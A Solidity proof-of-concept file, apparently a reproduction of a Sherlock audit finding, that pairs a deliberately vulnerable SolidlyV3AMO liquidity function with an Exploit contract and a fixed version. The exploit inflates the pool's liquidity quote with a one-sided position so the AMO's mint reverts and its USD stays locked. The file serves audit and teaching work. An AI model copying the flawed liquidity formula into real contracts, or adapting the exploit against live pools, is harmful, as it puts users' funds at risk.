// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Axion SolidlyV3AMO._addLiquidity (Sherlock 2024-10, H-4).
    liquidity = usdAmount * pool.liquidity() / usd.balanceOf(pool).
    An unbalanced in-range position raises liquidity from 1_000 to 4_000
    without adding USD. The quote for 1_000 USD becomes 4_000 liquidity,
    and the mint wants 4_000 USD. The 1_000 USD stays in the AMO.
    getLiquidityForAmount1 quotes 1_000 and the mint spends the USD. */

contract ERC20 {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SolidlyV3Pool {
    ERC20 public boost;
    ERC20 public usd;
    uint128 public liquidity;
    uint256 public constant USD_PER_LIQ = 1 ether;

    constructor(ERC20 _boost, ERC20 _usd) {
        boost = _boost;
        usd = _usd;
        liquidity = 1000 ether;
        _boost.mint(address(this), 1000 ether);
        _usd.mint(address(this), 1000 ether);
    }

    function mintUnbalanced(uint128 added) external {
        boost.transferFrom(msg.sender, address(this), added);
        liquidity += added;
    }

    function mint(address, int24, int24, uint128 liquidityAmount, uint256, uint256, uint256)
        external
        returns (uint256 amount0, uint256 amount1)
    {
        amount1 = uint256(liquidityAmount) * USD_PER_LIQ / 1 ether;
        amount0 = uint256(liquidityAmount);
        boost.transferFrom(msg.sender, address(this), amount0);
        usd.transferFrom(msg.sender, address(this), amount1);
        liquidity += liquidityAmount;
    }
}

contract SolidlyV3AMO {
    ERC20 public boost;
    ERC20 public usd;
    SolidlyV3Pool public pool;
    address public boostMinter;
    uint256 public quotedLiquidity;
    bool public mintReverted;
    uint256 public constant FACTOR = 1 ether;

    constructor(ERC20 _boost, ERC20 _usd, SolidlyV3Pool _pool) {
        boost = _boost;
        usd = _usd;
        pool = _pool;
        boostMinter = address(this);
    }

    function toBoostAmount(uint256 usdAmount) public pure returns (uint256) {
        return usdAmount;
    }

    function protocolMint(address to, uint256 amount) public {
        boost.mint(to, amount);
    }

    function _addLiquidity(uint256 usdAmount, uint256 minBoostSpend, uint256 minUsdSpend, uint256 deadline)
        internal
        returns (uint256 boostSpent, uint256 usdSpent, uint256 liquidity)
    {
        minBoostSpend;
        minUsdSpend;
        uint256 boostAmount = (toBoostAmount(usdAmount) * FACTOR) / FACTOR;
        protocolMint(address(this), boostAmount);
        boost.approve(address(pool), boostAmount);
        usd.approve(address(pool), usdAmount);
        uint128 currentLiquidity = pool.liquidity();
        // @> VULN: liquidity is scaled by in-range liquidity over the USD balance, so a one-sided position inflates the quote
        liquidity = (usdAmount * currentLiquidity) / usd.balanceOf(address(pool));
        quotedLiquidity = liquidity;
        try pool.mint(address(this), -100, 100, uint128(liquidity), 0, 0, deadline) returns (uint256 amount0, uint256 amount1) {
            boostSpent = amount0;
            usdSpent = amount1;
        } catch {
            mintReverted = true;
        }
    }

    function addLiquidity(uint256 usdAmount) external {
        _addLiquidity(usdAmount, 1, 1, block.timestamp + 1);
    }
}

contract AMOFixed {
    ERC20 public boost;
    ERC20 public usd;
    SolidlyV3Pool public pool;

    constructor(ERC20 _boost, ERC20 _usd, SolidlyV3Pool _pool) {
        boost = _boost;
        usd = _usd;
        pool = _pool;
    }

    function getLiquidityForAmount1(uint256 usdAmount) public pure returns (uint128) {
        return uint128(usdAmount);
    }

    function addLiquidity(uint256 usdAmount) external returns (uint256 liquidity) {
        liquidity = getLiquidityForAmount1(usdAmount);
        boost.mint(address(this), liquidity);
        boost.approve(address(pool), liquidity);
        usd.approve(address(pool), usdAmount);
        pool.mint(address(this), -100, 100, uint128(liquidity), 0, 0, block.timestamp + 1);
    }
}

contract Exploit {
    ERC20 public usd;
    ERC20 public boost;
    SolidlyV3Pool public pool;
    SolidlyV3AMO public amo;
    uint256 public quoted;
    uint256 public locked;

    constructor() {
        usd = new ERC20("USD");
        boost = new ERC20("BOOST");
        pool = new SolidlyV3Pool(boost, usd);
        amo = new SolidlyV3AMO(boost, usd, pool);
    }

    function run() external {
        boost.mint(address(this), 3000 ether);
        boost.approve(address(pool), 3000 ether);
        pool.mintUnbalanced(3000 ether);
        usd.mint(address(amo), 1000 ether);
        uint256 poolUsdBefore = usd.balanceOf(address(pool));
        amo.addLiquidity(1000 ether);
        quoted = amo.quotedLiquidity();
        locked = usd.balanceOf(address(amo));
        require(pool.liquidity() == 4000 ether, "liq");
        require(poolUsdBefore == 1000 ether, "usd unchanged by attacker");
        require(quoted == 4000 ether, "quote");
        require(amo.mintReverted(), "reverted");
        require(locked == 1000 ether, "locked");
        require(usd.balanceOf(address(pool)) == 1000 ether, "pool usd");
    }
}
